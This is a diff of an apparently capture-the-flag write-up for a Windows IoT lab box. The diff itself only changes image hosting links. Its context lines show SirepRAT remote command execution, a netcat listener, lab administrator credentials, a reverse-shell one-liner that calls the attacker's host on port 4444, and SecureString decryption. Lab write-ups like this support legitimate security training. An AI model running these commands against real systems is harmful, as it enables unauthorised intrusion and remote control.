@@ -114,7 +114,7 @@ SirepRat exploits the Sirep Test Service that’s built in and running on the of
 $ python SirepRAT.py 10.10.10.204 GetSystemInformationFromDevice
 ```
 
-![](https://i.imgur.com/yYxj94w.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748425/img/yYxj94w.png)
 
 ```bash
 # Command Execution
@@ -123,7 +123,7 @@ $ python SirepRAT.py 10.10.10.204 GetSystemInformationFromDevice
 $ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\hostname.exe"
 ```
 
-![](https://i.imgur.com/UhSE147.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748447/img/UhSE147.png)
 
 ## Intrusion
 
@@ -153,7 +153,7 @@ nc -lvp $LPORT
 
 It automatically uploads 64 bit version of netcat to the target machine and executes it and catches the shell with netcat.
 
-![](https://i.imgur.com/gXyZAvM.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748443/img/gXyZAvM.png)
 
 ## Enumeration
 
@@ -166,15 +166,15 @@ $env:ComputerName
 $PSVersionTable
 ```
 
-![](https://i.imgur.com/8cttRpV.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748411/img/8cttRpV.png)
 
 Since we have admin privileges I tried to read the root flag...
 
-![](https://i.imgur.com/CyfxHgi.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748453/img/CyfxHgi.png)
 
 Similar content was present in user flag as well so I enumerated further and found an interesting file which again contains similar content but it looks like admin credentials...
 
-![](https://i.imgur.com/On12GiZ.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748468/img/On12GiZ.png)
 
 On further enumeration I found a hidden file and this is where powershell is extremely useful...
 
@@ -182,7 +182,7 @@ On further enumeration I found a hidden file and this is where powershell is ext
 ls -force
 ```
 
-![](https://i.imgur.com/SwuRj4f.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748523/img/SwuRj4f.png)
 
 ```
 app:mesh5143
@@ -191,7 +191,7 @@ administrator:_1nt3rn37ofTh1nGz
 
 Here as you can see i got credentials for administrator! If you remember I found HTTP basic auth before I tried to login with these credentials and got access to the IoT dashboard!
 
-![](https://i.imgur.com/jINW20N.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748407/img/jINW20N.png)
 
 ## Privilege Escalation
 
@@ -201,7 +201,7 @@ Using the Run Command functionality in the dashboard I got a new reverse connect
 c:\windows\system32\nc64.exe 10.10.14.26 4444 -e powershell.exe
 ```
 
-![](https://i.imgur.com/c0iBFmY.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748521/img/c0iBFmY.png)
 
 At this point all I had to do was figure out how to decrypt powershell secure string. After numerous google searches I found these articles which helped in understanding the secure strings and ways to decode them
 
@@ -227,4 +227,4 @@ $flag = Import-Clixml -Path C:\Data\Users\administrator\root.txt
 $flag.GetNetworkCredential().Password
 ```
 
-![](https://i.imgur.com/4sLEogv.png)
+![](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1771748440/img/4sLEogv.png)
